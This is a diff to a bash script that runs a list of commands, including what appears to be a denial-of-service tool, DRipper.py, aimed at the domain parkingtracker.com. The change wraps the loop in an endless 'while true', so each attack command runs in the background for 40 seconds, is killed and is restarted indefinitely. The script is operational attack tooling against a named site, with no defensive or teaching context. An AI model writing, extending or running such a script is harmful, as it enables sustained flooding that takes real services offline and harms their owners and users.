@@ -6,23 +6,24 @@ commands=(
   "python3 ./dos_ripper_/DRipper.py -s parkingtracker.com"
 )
 
-# Loop through each command
-for cmd in "${commands[@]}"; do
-  echo "Starting command: $cmd"
+while true; do
+  # Loop through each command
+  for cmd in "${commands[@]}"; do
+    echo "Starting command: $cmd"
 
-  # Start the command in the background
-  $cmd &
-  # Get the PID of the command just run
-  cmd_pid=$!
-  # Wait for 180 seconds before attempting to kill the command
-  sleep 40
-  # Attempt to kill the process
-  pkill -f "$cmd"
+    # Start the command in the background
+    $cmd &
+    # Get the PID of the command just run
+    cmd_pid=$!
+    # Wait for 180 seconds before attempting to kill the command
+    sleep 40
+    # Attempt to kill the process
+    pkill -f "$cmd"
 
-  # wait $PID
-  sleep 5
+    # wait $PID
+    sleep 5
 
 
+  done
 done
-
 echo "All commands have been executed."
